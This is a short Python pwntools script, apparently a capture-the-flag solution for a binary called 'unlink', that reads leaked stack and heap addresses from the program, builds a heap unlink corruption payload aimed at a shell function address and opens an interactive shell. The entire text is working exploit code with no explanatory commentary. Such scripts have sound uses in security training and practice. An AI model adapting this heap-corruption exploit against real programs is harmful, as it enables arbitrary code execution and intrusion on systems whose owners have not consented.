from pwn import *

p = process("./unlink")
raw_input(">>")
res_stack = p.recvline_startswith('here is stack address leak: ')
stack = int(res_stack.split(':')[1].strip(), 16)
print "Stack: ", hex(stack)
res_heap = p.recvline_startswith('here is heap address leak: ')
heap = int(res_heap.split(':')[1].strip(), 16)
print "Heap: ", hex(heap)

shell_func_addr = 0x80484eb
payload = p32(shell_func_addr) + 'X' * 12 + p32(stack + 12) + p32(heap + 12)
p.sendline(payload)
p.interactive()